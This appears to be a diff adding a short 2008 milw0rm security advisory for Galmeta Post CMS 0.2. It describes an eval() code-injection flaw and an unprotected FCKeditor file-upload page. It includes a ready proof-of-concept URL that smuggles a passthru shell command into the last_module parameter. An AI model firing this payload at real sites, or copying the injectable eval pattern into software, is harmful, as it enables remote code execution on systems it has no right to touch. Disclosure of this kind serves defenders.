@@ -1,0 +1,24 @@
+###################################################################################
+## Galmeta Post CMS <= 0.2 Remote Code Execution / Arbitrary File Upload
+## Script : http://downloads.sourceforge.net/galmetapost
+## You Can Get Multiple Local File Inclusion Vulnerabilities To This Script 
+## From Here http://www.milw0rm.com/exploits/5944 By CWH Underground
+###################################################################################
+###################################################################################
+###################################################################################
+## Vulns & POC :
+##  1- Remote Code Execution Vulnerability In \_lib\adodb_lite\adodb-perf-module.inc.php
+##  In Line 20 :
+##  eval('class perfmon_parent_EXTENDER extends ' . $last_module . '_ADOConnection { }');
+##                    -----------------------------------
+##  Ex : /_lib/adodb_lite/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};passthru(ls);//
+###################################################################################
+###################################################################################
+###################################################################################
+##  2- (FCKeditor) Remote Arbitrary File Upload In \_lib\fckeditor\editor\filemanager\upload\test.html
+##                    -----------------------------------
+##  Ex : /_lib/fckeditor/editor/filemanager/upload/test.html
+##  Restrict And Grant Only Trusted Users Access To The Resources.
+###################################################################################
+
+# milw0rm.com [2008-09-23]
